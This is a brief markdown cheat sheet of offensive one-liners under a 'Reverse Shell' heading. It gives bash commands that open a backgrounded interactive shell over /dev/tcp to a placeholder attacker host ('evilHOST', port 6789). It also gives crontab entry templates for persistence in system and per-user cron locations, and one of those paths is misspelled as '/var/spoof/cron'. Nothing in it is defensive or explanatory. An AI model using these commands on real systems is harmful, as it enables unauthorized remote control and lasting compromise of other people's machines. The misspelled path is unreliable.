# Out of Band Technology

## Reverse Shell

### bash

```bash
# EHOST=evilHOST; EPORT=6789
bash -c "bash -i >& /dev/tcp/$EHOST/$EPORT 0>&1 &"
bash -i >& /dev/tcp/$EHOST/$EPORT 0>&1 &
```

### crontab (Unix-only)

```bash
# /etc/cron.d/<fileName>
* * * * * <username> <command>

# /etc/crontab
* * * * * <username> <command>

# /var/spoof/cron/<username>
* * * * * <command>
```
